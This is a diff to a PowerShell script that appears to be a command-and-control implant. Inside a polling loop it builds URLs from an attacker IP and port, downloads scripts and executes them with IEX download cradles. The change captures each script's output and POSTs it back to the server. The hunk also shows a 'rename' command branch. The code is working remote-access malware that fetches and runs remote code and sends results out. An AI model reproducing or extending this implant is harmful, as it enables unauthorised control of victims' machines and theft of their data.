@@ -65,7 +65,9 @@ for (;;){
             $bp = "http" + ':' + "//$ip" + ':' + "$port/bp"
             IEX(New-Object Net.WebClient).DownloadString("$bp");
             $cradle = "http" + ':' + "//$ip" + ':' + "$port/dl/$script_id"
-            IEX(New-Object Net.WebClient).DownloadString("$cradle");
+            $res = IEX(New-Object Net.WebClient).DownloadString("$cradle");
+            $data = @{result = "$res"}
+            Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
         } elseif ($command -eq "rename") {
             $url = ("http" + ':' + "//$ip" + ':' + "$port/rename/$name")
 
